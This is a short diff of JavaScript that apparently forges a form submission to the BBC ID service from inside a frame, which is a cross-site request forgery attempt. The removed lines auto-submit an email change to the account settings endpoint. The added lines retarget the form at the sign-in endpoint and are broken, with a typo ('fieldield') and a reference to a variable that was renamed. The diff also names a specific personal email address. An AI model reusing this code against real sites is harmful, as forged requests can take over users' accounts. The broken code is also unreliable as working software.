@@ -2,15 +2,14 @@ var frame = window.frames[0].document.documentElement;
 
  var form = document.createElement("form");
  form.setAttribute("method", "post");
-form.setAttribute("action", "https://ssl.bbc.co.uk/id/settings");
+form.setAttribute("action", "https://ssl.bbc.co.uk/id/signin");
 
-  var hiddenField = document.createElement("input");
+  var field = document.createElement("input");
   //hiddenField.setAttribute("type", "hidden");
-  hiddenField.setAttribute("email", "ianfangbh%40hotmail.co.uk");
-  hiddenField.setAttribute("bbcid_submit_butto", "save");
+  field.setAttribute("unique", "ianfangbh_12345%40hotmail.co.uk");
+  fieldield.setAttribute("bbcid_submit_butto", "Sign in");
+  
 
   form.appendChild(hiddenField);
-        
-  
     frame.appendChild(form);
-    form.submit();
+  //  form.submit();
